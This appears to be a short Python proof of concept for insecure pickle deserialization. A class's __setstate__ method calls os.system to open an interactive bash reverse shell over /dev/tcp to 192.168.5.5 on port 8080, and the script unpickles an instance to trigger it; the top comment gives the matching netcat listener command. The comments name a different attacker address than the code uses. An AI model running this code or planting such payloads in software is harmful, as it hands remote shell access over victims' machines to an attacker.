# test：nc -l -p 8080
import os
import pickle


class Foobar:
    def __init__(self):
        pass

    def __getstate__(self):
        return self.__dict__

    def __setstate__(self, state):
        # The attack is from 192.168.1.10
        # The attacker is listening on port 8080
        os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.5/8080 0>&1"')


f = Foobar()
f_pickled = pickle.dumps(f)
f_unpickled = pickle.loads(f_pickled)
